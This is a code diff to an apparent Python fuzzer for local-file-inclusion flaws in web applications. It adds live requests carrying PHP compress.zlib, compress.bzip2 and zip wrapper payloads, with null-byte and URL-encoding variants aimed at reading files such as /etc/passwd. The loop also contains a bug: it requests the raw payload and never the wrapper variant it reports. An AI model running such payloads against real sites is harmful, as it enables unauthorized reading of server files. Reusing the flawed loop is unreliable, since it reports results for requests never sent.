@@ -172,10 +172,30 @@ def wrapper_data_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, r
 
     
 def wrapper_compress_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
-    print(f"{url}compress.zlib://{payload}")
-    print(f"{url}compress.zlib://{payload}%00")    
-    print(f"{url}compress.bzip2://{payload}")
-    print(f"{url}compress.bzip2://{payload}%00")
+    compress_payloads = [f"compress.zlib://{payload}",
+                         f"compress.bzip2://{payload}",
+                         f"compress.zlib://{payload}%00",
+                         f"compress.bzip2://{payload}%00",
+                         f"zip://test.zip#/tmp/test.php",
+                         f"zip://test.zip#/tmp/test.php%00",]
+    for p in compress_payloads:
+        resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
+        # urlencode
+        resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
+        resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+        # double urlencode
+        resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
+        resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
     
     
 def wrapper_php_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):  
@@ -256,8 +276,16 @@ def main():
             print("[!] Wrapper data fuzzing")
             print("------------------------\n")
             wrapper_data_fuzz(url, path, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)
-            """wrapper_compress_fuzz("http://test.ru?page=", "/etc/passwd")
-            wrapper_php_fuzz("http://test.ru?page=", "/etc/passwd")"""
+
+            print("\n------------------------")
+            print("[!] Wrapper compress fuzzing")
+            print("------------------------\n")
+            wrapper_compress_fuzz(url, path, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)
+
+            print("\n------------------------")
+            print("[!] Wrapper php fuzzing")
+            print("------------------------\n")
+            #wrapper_php_fuzz(url, path, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)
         else:
             help()
     except KeyboardInterrupt:
